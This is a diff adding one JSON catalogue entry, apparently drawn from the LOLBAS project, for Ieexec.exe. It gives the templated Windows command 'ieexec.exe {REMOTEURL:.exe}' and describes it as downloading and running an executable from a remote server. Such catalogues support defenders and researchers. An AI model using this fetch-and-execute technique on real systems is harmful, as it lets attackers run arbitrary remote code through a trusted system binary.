@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-ieexec-exe-download",
+  "name": "LOLBAS · Ieexec.exe (Download)",
+  "command": "ieexec.exe {REMOTEURL:.exe}",
+  "description": "Downloads and executes executable from the remote server.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "ieexec",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Ieexec/",
+  "upstream_id": "Ieexec.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Ieexec.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Ieexec/"
+    }
+  ]
+}
